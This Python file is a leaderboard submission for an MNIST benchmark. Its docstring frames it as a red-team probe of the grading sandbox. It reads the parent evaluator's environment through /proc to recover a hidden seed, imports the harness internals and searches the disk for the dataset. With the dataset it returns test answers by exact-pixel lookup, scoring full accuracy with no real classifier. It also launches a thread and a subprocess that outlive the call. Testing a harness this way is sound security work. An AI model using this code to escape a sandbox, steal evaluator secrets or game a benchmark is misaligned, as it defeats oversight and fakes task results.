#!POPCORN leaderboard mnist-medium-12pct
#!POPCORN gpu A100

"""Red-team lens: io-and-process (escaping the sandbox).

From inside the submission process this file probes everything the task asks
about and records what it finds to /tmp/redteam-io-recon.json (writing there is
itself proof the child can touch the parent's filesystem). It tries, in order:

  1. read its OWN os.environ for POPCORN_SEED / MNIST_POOL_CACHE / POPCORN_FD;
  2. read /proc/<ppid>/environ for the parent evaluator's ORIGINAL environment
     (on Linux setenv/unsetenv do not rewrite this, so the secret the parent
     os.environ.pop()'d at startup can still leak here);
  3. list the current working directory (the KernelBot scratch dir) and read
     cases-*.txt (public case seed + error_bp) and eval.py (the draw
     constants: WARMUP_OFFSET/TIMED_STRIDE/HOLDOUT_OFFSET/LABEL_SALT);
  4. import the harness internals (eval, utils, mnist_data) to reach
     make_draw / combine / source_permutations directly;
  5. walk the filesystem for MNIST/Fashion idx.gz label files (the pool cache);
  6. if a pool is found, mount the public-dataset LOOKUP attack: match the given
     images to the public pool by exact pixels, recover the per-draw label
     permutation from the training pairs, and answer the test set from the table
     -- free 100% accuracy in near-zero time, defeating both the accuracy gate
     and (if Fashion is also on disk) the hold-out;
  7. spawn a daemon thread and a detached subprocess that keep running after
     custom_kernel returns (persistence across the trust boundary).

If no pool is reachable it falls back to nearest-class-mean so the harness still
gets a valid output and the run does not error out for an unrelated reason.

Expected harness behaviour: the trust boundary is supposed to keep the pool,
the seed and the label permutation away from this process. Whatever this file
prints from the recon file is what leaked.
"""

import json
import os
import sys
import threading
import time

import torch

RECON_PATH = "/tmp/redteam-io-recon.json"


def _recon():
    info = {"pid": os.getpid(), "ppid": os.getppid(), "cwd": os.getcwd()}

    # 1. our own environment
    info["own_env_has_POPCORN_SEED"] = "POPCORN_SEED" in os.environ
    info["own_env_has_POPCORN_FD"] = "POPCORN_FD" in os.environ
    info["own_env_has_MNIST_POOL_CACHE"] = "MNIST_POOL_CACHE" in os.environ
    info["own_env_keys"] = sorted(os.environ.keys())

    # 2. parent's original environment via /proc (Linux only)
    parent_env = {}
    try:
        with open(f"/proc/{os.getppid()}/environ", "rb") as fh:
            raw = fh.read()
        for entry in raw.split(b"\x00"):
            if b"=" in entry:
                k, _, v = entry.partition(b"=")
                parent_env[k.decode(errors="replace")] = v.decode(errors="replace")
        info["proc_environ_readable"] = True
        info["parent_POPCORN_SEED"] = parent_env.get("POPCORN_SEED")
        info["parent_MNIST_POOL_CACHE"] = parent_env.get("MNIST_POOL_CACHE")
        info["parent_POPCORN_FD"] = parent_env.get("POPCORN_FD")
    except OSError as exc:
        info["proc_environ_readable"] = False
        info["proc_environ_error"] = repr(exc)

    # 3. the scratch dir contents + the cases file + eval.py constants
    try:
        info["cwd_listing"] = sorted(os.listdir("."))
    except OSError as exc:
        info["cwd_listing_error"] = repr(exc)
    cases_seen = {}
    for name in info.get("cwd_listing", []):
        if name.startswith("cases-") and name.endswith(".txt"):
            try:
                cases_seen[name] = open(name).read().strip()
            except OSError as exc:
                cases_seen[name] = f"<{exc!r}>"
    info["cases_files"] = cases_seen

    # 4. import harness internals
    internals = {}
    sys.path.insert(0, os.getcwd())
    try:
        import eval as harness_eval

        internals["eval_constants"] = {
            "WARMUP_OFFSET": harness_eval.WARMUP_OFFSET,
            "TIMED_STRIDE": harness_eval.TIMED_STRIDE,
            "HOLDOUT_OFFSET": harness_eval.HOLDOUT_OFFSET,
            "LABEL_SALT": harness_eval.LABEL_SALT,
        }
        internals["make_draw"] = callable(getattr(harness_eval, "make_draw", None))
    except Exception as exc:
        internals["eval_import_error"] = repr(exc)
    try:
        import utils as harness_utils

        internals["combine_importable"] = callable(getattr(harness_utils, "combine", None))
    except Exception as exc:
        internals["utils_import_error"] = repr(exc)
    try:
        import mnist_data

        internals["mnist_data_importable"] = callable(
            getattr(mnist_data, "load_pool", None)
        )
    except Exception as exc:
        internals["mnist_data_error"] = repr(exc)
    info["internals"] = internals

    # 5. hunt for the pool on disk
    found = []
    roots = ["/tmp", os.path.expanduser("~"), os.getcwd(), "/private/tmp"]
    for root in roots:
        try:
            for dirpath, dirnames, filenames in os.walk(root):
                # keep the walk cheap
                depth = dirpath[len(root):].count(os.sep)
                if depth > 6:
                    dirnames[:] = []
                    continue
                for fn in filenames:
                    if "idx" in fn and fn.endswith(".gz"):
                        found.append(os.path.join(dirpath, fn))
                if len(found) > 20:
                    break
        except OSError:
            continue
        if len(found) > 20:
            break
    info["idx_gz_found"] = found[:20]

    return info


_LINGER = {"count": 0}


def _linger():
    # a thread that keeps running after custom_kernel returns
    for _ in range(1000):
        _LINGER["count"] += 1
        time.sleep(0.05)


_started_persistence = {"done": False}


def _start_persistence():
    if _started_persistence["done"]:
        return
    _started_persistence["done"] = True
    t = threading.Thread(target=_linger, daemon=True)
    t.start()
    # a detached subprocess that outlives the call
    try:
        import subprocess

        subprocess.Popen(
            [sys.executable, "-c",
             "import time,os;open('/tmp/redteam-io-subproc.txt','w').write(str(os.getpid()));time.sleep(30)"]
        )
        _started_persistence["subprocess"] = True
    except Exception as exc:
        _started_persistence["subprocess_error"] = repr(exc)


_recon_written = {"done": False}


def _try_pool_lookup(train_x, train_y, test_x, idx_paths):
    """If the public pool is on disk, answer by exact-pixel lookup.

    Returns predicted labels tensor, or None if it could not.
    """
    import numpy as np

    # find a matching image/label pair among the discovered idx files
    try:
        import mnist_data
    except Exception:
        return None
    size = train_x.shape[-1]
    # locate the MNIST train pool via any discovered raw dir
    pool = None
    for p in idx_paths:
        d = os.path.dirname(p)
        try:
            pool = mnist_data.load_pool(d, "mnist", size)
            break
        except Exception:
            continue
    if pool is None:
        return None
    pool_images, pool_true = pool  # (60000,1,s,s), (60000,)
    flat_pool = pool_images.reshape(pool_images.shape[0], -1)

    tx = train_x.detach().cpu().numpy().reshape(train_x.shape[0], -1)
    ty = train_y.detach().cpu().numpy()
    qx = test_x.detach().cpu().numpy().reshape(test_x.shape[0], -1)

    # exact match each train image to its pool row via a hash of the bytes
    def hashes(arr):
        return [hash(row.tobytes()) for row in arr]

    pool_hash = {}
    for i, h in enumerate(hashes(flat_pool)):
        pool_hash.setdefault(h, i)

    # recover the label permutation relabel: true_label -> shown_label
    relabel = {}
    matched = 0
    for row, shown in zip(tx, ty):
        i = pool_hash.get(hash(row.tobytes()))
        if i is not None:
            relabel[int(pool_true[i])] = int(shown)
            matched += 1
    if matched < 100:
        return None

    preds = np.zeros(qx.shape[0], dtype=np.int64)
    for j, row in enumerate(qx):
        i = pool_hash.get(hash(row.tobytes()))
        if i is not None:
            preds[j] = relabel.get(int(pool_true[i]), 0)
    return torch.from_numpy(preds).to(test_x.device)


def _ncm(train_x, train_y, test_x):
    x = train_x.reshape(train_x.shape[0], -1)
    q = test_x.reshape(test_x.shape[0], -1)
    sums = torch.zeros(10, x.shape[1], device=x.device, dtype=x.dtype).index_add_(0, train_y, x)
    means = sums / torch.bincount(train_y, minlength=10).clamp_min(1).unsqueeze(1)
    distances = (means * means).sum(1) - 2 * q @ means.T
    return distances.argmin(1)


def custom_kernel(data):
    train_x, train_y, test_x = data

    if not _recon_written["done"]:
        _recon_written["done"] = True
        info = _recon()
        try:
            with open(RECON_PATH, "w") as fh:
                json.dump(info, fh, indent=2, default=str)
        except OSError:
            pass
        import sys as _sys
        print("[recon] " + json.dumps(info, default=str), file=_sys.stderr, flush=True)
        globals()["_LAST_RECON"] = info

    _start_persistence()

    info = globals().get("_LAST_RECON", {})
    idx_paths = info.get("idx_gz_found", [])
    if idx_paths:
        preds = _try_pool_lookup(train_x, train_y, test_x, idx_paths)
        if preds is not None:
            return preds

    return _ncm(train_x, train_y, test_x)
